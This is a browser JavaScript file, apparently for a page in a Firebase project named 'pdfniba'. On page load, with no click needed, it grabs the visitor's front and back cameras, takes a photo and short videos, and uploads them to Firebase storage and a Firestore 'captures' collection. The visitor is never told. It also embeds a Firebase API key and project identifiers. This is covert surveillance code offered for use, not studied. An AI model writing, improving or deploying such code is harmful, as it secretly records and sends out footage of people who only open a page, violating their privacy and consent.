import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// ✅ FIXED FIREBASE CONFIG
const firebaseConfig = {
  apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
  authDomain: "pdfniba.firebaseapp.com",
  projectId: "pdfniba",
  storageBucket: "pdfniba.appspot.com",   // <-- FIXED!!!
  messagingSenderId: "809688909652",
  appId: "1:809688909652:web:9867944191bd95704aaac1"
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

// ⛔ NO CLICK REQUIRED — auto start once
window.addEventListener("load", () => startCapture());

async function startCapture() {
  try {
    // Try front camera
    const frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    // Take photo
    const imageCapture = new ImageCapture(frontStream.getVideoTracks()[0]);
    const photoBlob = await imageCapture.takePhoto();

    // 3 second video
    const frontVideoBlob = await recordVideo(frontStream, 3000);
    frontStream.getTracks().forEach(t => t.stop());

    // Try back camera
    let backStream = null;
    try {
      backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" } }
      });
    } catch (e) {
      backStream = await navigator.mediaDevices.getUserMedia({
        video: true
      });
    }

    const backVideoBlob = await recordVideo(backStream, 3000);
    backStream.getTracks().forEach(t => t.stop());

    // Upload
    const photoURL = await uploadToFirebase(photoBlob, "front.jpg");
    const frontVideoURL = await uploadToFirebase(frontVideoBlob, "front.mp4");
    const backVideoURL = await uploadToFirebase(backVideoBlob, "back.mp4");

    // Save to Firestore
    await addDoc(collection(db, "captures"), {
      photoURL,
      frontVideoURL,
      backVideoURL,
      createdAt: Date.now()
    });

    console.log("🔥 Saved to Firestore!");
  } catch (err) {
    console.error(err);
  }
}

// Upload helper
async function uploadToFirebase(blob, name) {
  const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
  await uploadBytes(fileRef, blob);
  return await getDownloadURL(fileRef);
}

// Record video helper
function recordVideo(stream, ms) {
  return new Promise(resolve => {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/mp4" }));
    recorder.start();
    setTimeout(() => recorder.stop(), ms);
  });
}
